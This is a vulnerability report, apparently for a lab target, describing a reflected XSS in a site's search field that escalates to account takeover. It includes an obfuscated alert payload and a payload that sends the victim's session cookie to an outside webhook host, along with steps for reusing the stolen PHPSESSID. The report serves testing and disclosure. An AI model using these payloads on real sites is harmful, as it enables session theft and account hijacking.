## Title
Reflected XSS to Account Takeover

## Description
**Affected URL:** https://pixeleet.pwnedbox.site/index.php

The search parameter is vulnerable to Reflected XSS, allowing JavaScript execution through crafted search input. The vulnerability was further exploited to capture the victim's PHPSESSID and gain access to the victim's authenticated account.

## Steps to Reproduce

1. Open [https://pixeleet.pwnedbox.site/](https://pixeleet.pwnedbox.site/).
2. Enter the following Reflected XSS payload in the search field:

   ```html
   "><ScRiPt>\u0061lert("XSS")</ScRiPt>
   ```

3. Submit the search query and observe the JavaScript alert.
4. Test the following payload using the controlled Webhook.site endpoint:

   ```javascript
   '"><script>document.write(`<img src=https://webhooksite.net/c26ce1f5-a093-4e8a-a9fe-79d2116ae8ff/${document.cookie}>`)</script>
   ```

5. Observe the incoming request on Webhook.site containing the victim's session cookie.
6. Use the captured session identifier to access the victim's authenticated account.

## POC (Proof of Concept)

**Affected Domain:** https://pixeleet.pwnedbox.site/

-crafting the xss 
<img width="1919" height="972" alt="image" src="https://github.com/user-attachments/assets/d89f4bef-840a-48ea-ba43-efbaa4a6d694" />

- Reflected XSS confirmed through JavaScript alert execution.
<img width="1919" height="972" alt="image" src="https://github.com/user-attachments/assets/6f69ce59-6773-438b-b5ed-8a044bb19714" />

-crafting the payload for cookie to get 
<img width="1919" height="994" alt="image" src="https://github.com/user-attachments/assets/1cb8dad2-7d45-466a-8cdd-57d3db45ef67" />

-open the crafted url in the firefox 
<img width="1910" height="974" alt="image" src="https://github.com/user-attachments/assets/bd65e28d-2bb7-4501-9edf-d757c03b2272" />


- Victim's PHPSESSID successfully captured through Webhook.site.
<img width="1919" height="971" alt="image" src="https://github.com/user-attachments/assets/0e93a8aa-7335-4cb2-b1b7-210fca17989e" />

- Successfully accessed the victim's account using the captured session.
<img width="1919" height="980" alt="image" src="https://github.com/user-attachments/assets/e14a8fa8-c0cd-4236-9c08-8867210eca42" />

## Impact
- It allows attackers to hijack user session.
- It potentially leads to full account takeover.
- It allows to perform unauthorized actions within the vulnerable application.

## Remediation
- Filter out HTML tags like `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database.
- Implement proper input validation and sanitization for all user-controlled input.
- Apply context-aware output encoding before rendering user input in HTML pages.
- Use textContent instead of innerHTML when displaying user-supplied data.
